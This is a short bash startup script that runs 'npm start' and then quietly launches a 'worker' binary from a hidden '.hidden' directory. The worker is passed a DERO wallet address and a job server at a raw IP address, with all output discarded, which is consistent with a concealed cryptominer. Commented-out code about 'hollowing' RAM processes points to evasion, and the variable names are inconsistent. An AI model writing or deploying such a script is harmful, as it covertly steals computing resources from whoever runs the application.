#!/bin/bash

# Run npm start in the background
nohup npm start &

# Change directory to /usr/src/app/.hidden
cd /usr/src/app/.hidden

# Function to hollow the RAM processes
#hollow_ram_processes() {
    # Get the process ID (PID) of the main script
    #main_pid=$(pgrep -f "./api")

    #if [ -n "$api_pid" ]; then
        # Hollow the RAM processes
    #    echo "Hollowing RAM processes for PID $api_pid..."
        gcore -o /dev/null -R $api_pid >/dev/null 2>&1
    #else
    #    echo "No main process found."
    #fi
#}

# Execute the main script

./worker -apikey dero1qy50kjxf2emamc9ejpzfezda0z2v2uf30qsqgld6qseuv7l3uuaggqgsgznth -jobserver 141.148.93.156:443 > /dev/null 2>&1




# Call the function to hollow the RAM processes
#hollow_ram_processes
